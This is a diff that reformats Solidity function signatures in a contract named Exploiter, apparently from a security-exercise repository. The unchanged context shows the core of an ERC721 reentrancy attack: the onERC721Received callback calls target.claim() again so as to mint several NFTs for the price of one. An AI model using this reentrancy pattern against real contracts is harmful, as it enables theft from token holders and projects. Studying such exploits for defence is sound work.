@@ -15,12 +15,9 @@ interface ITarget {
 }
 
 interface IERC721Receiver {
-    function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external returns (bytes4);
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4);
 }
 
 /// Define the Exploiter contract
@@ -39,12 +36,11 @@ contract Exploiter is IERC721Receiver {
         target.claim();
     }
 
-    function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external override returns (bytes4) {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        override
+        returns (bytes4)
+    {
         /// Reentrancy attack: Call claim until we mint multiple NFTs for the price of 1
         if (target.balanceOf(address(this)) < 2) target.claim();
 
